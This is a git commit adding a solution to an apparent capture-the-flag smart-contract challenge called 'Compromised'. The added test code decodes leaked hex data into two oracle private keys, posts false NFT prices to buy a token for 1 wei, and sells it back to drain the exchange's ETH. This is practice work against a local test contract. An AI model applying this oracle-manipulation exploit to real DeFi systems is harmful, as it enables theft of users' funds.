94e4bef71449e1c7d6bbf01d863d3c68ca36a0a7
Katie <okdonga@gmail.com>
2023-03-01 11:06:10 +0900

    Upload solution to compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -61,6 +61,64 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        // Step1 decode hex data & retrieve private keys
+        function decode(leadkedData) {
+            const hex = leadkedData.split(' ').join('');
+            const base64String = Buffer.from(hex, 'hex').toString('utf8');
+            const key = Buffer.from(base64String, 'base64').toString('utf8');
+            return key;
+        }
+        
+        const privateKey1 = decode('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35');
+        const privateKey2 = decode('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34');
+
+        // create an instance of Wallet from the private key
+        const oracles = [privateKey1, privateKey2].map(privateKey => {
+            return new ethers.Wallet(privateKey,  ethers.provider);
+        })
+
+        console.log(
+            'NFT price before attack: ',
+            String(await this.oracle.getMedianPrice('DVNFT')).slice(0, -18)
+        )
+
+        // Step2 change its price to zero 
+        await this.oracle.connect(oracles[0]).postPrice("DVNFT", 0);
+        await this.oracle.connect(oracles[1]).postPrice("DVNFT", 0);
+
+        console.log(
+            'NFT price after: ',
+            String(await this.oracle.getMedianPrice('DVNFT'))
+        )
+
+        // Step3 buy low
+        const tx = await this.exchange.connect(attacker).buyOne({ value: 1 }); // 1 wei 
+        
+        const receipt = await tx.wait()
+        const event = receipt.events.find(e => e.event === 'TokenBought')
+        const tokenId = event.args[1].toString();
+        console.log(
+            'Token id: ',
+            String(await tokenId)
+        )
+        
+        // Step4 change price of NFT to EXCHANGE_INITIAL_ETH_BALANCE
+        await this.oracle.connect(oracles[0]).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(oracles[1]).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        
+        console.log(
+            'NFT price when selling: ',
+            String(await this.oracle.getMedianPrice('DVNFT')).slice(0, -18)
+        )
+     
+        // Step5 sell high - approve NFT to the exchange and sell it for all its ETH
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await this.exchange.connect(attacker).sellOne(tokenId);
+
+        // Step6 change back to the INITIAL_NFT_PRICE 
+        await this.oracle.connect(oracles[0]).postPrice("DVNFT", INITIAL_NFT_PRICE);        
+        await this.oracle.connect(oracles[1]).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
